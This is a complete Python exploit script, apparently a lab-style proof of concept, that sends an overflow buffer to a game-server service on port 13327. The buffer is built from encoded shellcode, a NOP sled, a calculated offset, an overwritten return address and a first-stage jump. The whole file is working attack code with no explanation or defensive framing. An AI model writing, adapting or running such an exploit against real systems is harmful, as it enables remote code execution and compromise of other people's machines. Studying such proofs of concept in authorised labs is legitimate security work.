#!/usr/bin/python
import socket

shellcode =  b""
shellcode += b"\xba\xbf\x84\x8c\x06\xdb\xdf\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x12\x31\x55\x12\x83\xed\xfc"
shellcode += b"\x03\xea\x8a\x6e\xf3\x25\x48\x99\x1f\x16\x2d"
shellcode += b"\x35\x8a\x9a\x38\x58\xfa\xfc\xf7\x1b\x68\x59"
shellcode += b"\xb8\x23\x42\xd9\xf1\x22\xa5\xb1\xc1\x7d\x22"
shellcode += b"\x80\xaa\x7f\xcd\x03\x90\x09\x2c\xb3\x80\x59"
shellcode += b"\xfe\xe0\xff\x59\x89\xe7\xcd\xde\xdb\x8f\xa3"
shellcode += b"\xf1\xa8\x27\x54\x21\x60\xd5\xcd\xb4\x9d\x4b"
shellcode += b"\x5d\x4e\x80\xdb\x6a\x9d\xc3"

host = "192.168.193.44"

nop_sled    = "\x90" * 8                     # NOP sled
offset      = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip         = "\x96\x45\x13\x08"             # 08134596 (jmp esp)
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # Fills 7 bytes - jumps to EAX+12, and 2 NOPS
buffer      = "\x11(setup sound " + nop_sled + shellcode + offset + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*] Payload sent!")
